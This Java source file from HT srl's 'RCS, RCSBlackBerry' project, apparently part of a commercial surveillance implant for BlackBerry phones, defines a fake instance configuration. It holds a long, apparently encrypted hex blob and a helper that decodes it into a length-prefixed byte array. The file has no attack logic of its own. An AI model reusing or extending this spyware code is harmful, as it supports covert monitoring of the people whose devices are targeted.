//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package fake;

import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.NumberUtilities;

public class InstanceConfigFake {
    //#ifdef FAKECONF
     
    //polluce 1
    //824
    static String configString = "00000000000000004a87b44316292886c8635e6038f1748142f4be265da462803528f700d58238ae6b5cba8daf04db840b75ab77dd8bd86516dce540687adb02fd839b7069c65a5453cc19ee30ffdf24f3f1f6e60a95da7486091d6ab8ef79e6d51489557497984a76e0bffcc06908b4948166b545045e5db7f55fd1feddc11bcb38c732b2bd56ae66659b6042c1d95d8245c5c7d0b1df8e6746afd7c274c10519c0fa1803a11297c2f599b32eb44addea99f20e02bb6ac55532734ea2d04a36c5872805a287ced15863d17cf901d5da642b8f8253101d1380a52cc8f1b40eb3e652f4d2242e2ff102c8cabde231338120fc17afea4f26c1d7ce95b64e1dfdd7426e7326175bab3dfdd19004c1361a911560180fc258a2413327322b3c91b4a08eb0aa27bf25f14068ea6e625681f782f9ca57834f4805ff7b5542700fcc371b83267f1e4d15547e2718549e9b34967a3215159ed8af4a2555d00d572393acd3df65529f0bc942c23141bc3d2006f7d29757a09e7af35cf58a8b63dfafd2dc37d59156bdaaf1c89cc1a144960ca1c6537139e705126f01d65f19e99fbe95bfbeb95093f04829c14300fc249a5285b859473dbe863746d66dde076c15fb0d6567ec80a9bc9e5da652a3f9480555b6c0a87ad367ec06bff1a1a5a487e08ebdd912d68f6f39677d5c31af3a69aa081fa56c9b6c33f1ccdd254aaf4ca5763893055f98911759ae38cbcaaab876104be4f00310e5c7943427c22b974f28a03a23d8a0ae1de865f038dd59f4e53e9dfe1c54e2d585debd44a6c0daf5c4c275292eda6e8793beb406a13be1d68c421f2ddaf7e195611237afdd26eeefa28bc69e61761542f5f379fe05bcfced8b0f60cd531d2c2c869998efdc41a274b12751427f64736d8ab928ad9f7aa93b1c33cf647ac9ca73bbac1d2151040ed3230c6e3960836186ddf32ba83834744abecd05f430f4c2ebadb84212835c0eb89f3aee93cfc06d1096a194c98dcac757a0675da5d3bba2e10547a963f100a8f22288d0f10591167d2becfee451b9bd3b9f8512eb8480f9ced5afeb44d4ac276f1f7c311b7d2904ae9095d7d1b2b2a165de40d595f1cdb009c2fbf6e5f5054dcb5f5543fa7cc1a7374320f2009b86c42fcf4cc989d6e3ab7c6b95c1d739ddd22a802e4a71e678957a752646459148c14726d772261e20fb69a97661a01ab0351b50d5147103d969488932899b16bce5";
    
    static byte[] config;
    
    public int version = 2;

    public static byte[] getBytes() {        
        config = hexStringToByteArray(configString);        
        return config;
    }
    
    /**
     * Hex string to byte array.
     * 
     * @param wchar
     *            the wchar
     * @return the byte[]
     */
    public static byte[] hexStringToByteArray(final String config) {
        int offset = 4;
        int len = config.length() / 2;
        final byte[] ret = new byte[ len + 4];

        for (int i = offset; i < ret.length; i++) {
            final char first = config.charAt((i - offset) * 2);
            final char second = config.charAt((i - offset) * 2 + 1);

            int value = NumberUtilities.hexDigitToInt(first) << 4;
            value += NumberUtilities.hexDigitToInt(second);

            ret[i] = (byte) value;
        }
        
        final DataBuffer databuffer = new DataBuffer(ret, 0, 4, false);
        databuffer.writeInt(len);

        return ret;
    }
    
    //#else
    public static byte[] getBytes() {        
        return null;
    }
  //#endif
}

